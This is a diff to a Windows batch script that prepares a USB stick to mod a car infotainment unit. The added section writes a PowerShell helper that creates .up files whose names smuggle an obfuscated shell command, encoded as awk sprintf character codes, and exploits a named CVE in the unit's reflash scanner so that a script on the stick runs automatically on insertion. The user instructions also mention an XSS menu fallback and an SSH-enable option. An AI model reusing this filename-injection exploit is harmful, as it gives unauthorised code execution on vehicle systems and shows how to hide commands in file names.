@@ -236,13 +236,35 @@ if exist "%FILES%\usb_unlock\h" (
   if errorlevel 1 (echo copy of h dispatcher failed ^& goto menu)
 )
 
+:: --- CVE-2024-8359 .up filename injection payloads ---
+:: The CMU reflash scanner passes .up filenames to system() unsanitised.
+:: Filenames encode "sh /mnt/sd[abcd]1/t" (or /tmp/mnt/...) via awk sprintf.
+:: Two files cover both mount-point prefixes; the 't' trampoline deduplicates.
+:: PowerShell creates them because the names contain $()' which CMD cannot.
+echo creating .up injection payloads...
+set "UPSCRIPT=%TEMP%\hud_up.ps1"
+>  "!UPSCRIPT!" echo $d=$args[0]
+>> "!UPSCRIPT!" echo $q=[char]39
+>> "!UPSCRIPT!" echo $m='$^(' + 'awk -v f=%%c ' + $q + 'BEGIN{s=f f f f f f f f f f f f f f f f f f f;system^(sprintf^(s,115,104,32,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116^)^)}' + $q + '^).up'
+>> "!UPSCRIPT!" echo $t='$^(' + 'awk -v f=%%c ' + $q + 'BEGIN{s=f f f f f f f f f f f f f f f f f f f f f f f;system^(sprintf^(s,115,104,32,47,116,109,112,47,109,110,116,47,115,100,91,97,98,99,100,93,49,47,116^)^)}' + $q + '^).up'
+>> "!UPSCRIPT!" echo New-Item -ItemType File -Path ^(Join-Path $d $m^) -Force ^| Out-Null
+>> "!UPSCRIPT!" echo New-Item -ItemType File -Path ^(Join-Path $d $t^) -Force ^| Out-Null
+>> "!UPSCRIPT!" echo ^(Get-ChildItem -LiteralPath $d -Filter '*.up'^).Count
+set "UPCOUNT=0"
+for /f %%u in ('powershell -NoProfile -ExecutionPolicy Bypass -File "!UPSCRIPT!" "!TARGET!\"') do set "UPCOUNT=%%u"
+del /q "!UPSCRIPT!" 2>nul
+if !UPCOUNT! GEQ 2 (echo * !UPCOUNT! .up payloads created) else (echo WARNING: expected 2 .up payloads, got !UPCOUNT! -- auto-trigger may not work)
+
+echo.
 echo done. Safely eject and take to the car.
-echo In CMU: Media -^> USB -^> tap any mp3 ^(or let it autoplay^) -^> the XSS menu appears.
-echo   SSH   enable SSH for this toolkit
-echo   HUD+  install the CarPlay + Android Auto HUD patch ^(tap twice; the unit reboots by itself^)
-echo   HUD-  remove it ^(back to stock^)      HUD?  check that every part is active
-echo   Every HUD button ends with a message on screen. If it says ERROR, take a photo
-echo   and send it; the same text and the full log are on the stick in hud-mod\logs\
+echo.
+echo   Insert the stick and wait ~30s -- a dialog appears automatically.
+echo   ^(the .up injection triggers the reflash scanner; if no dialog, open
+echo    Media -^> USB -^> play any track -- the XSS fallback menu appears^)
+echo.
+echo   Dialog: Install / Uninstall / Check Status -- the unit reboots by itself.
+echo   Screen goes dark for ~2 min after install/uninstall -- this is normal.
+echo   If the dialog says ERROR, photo it and send; logs are in hud-mod\logs\.
 goto menu
 
 :: ===============================================================
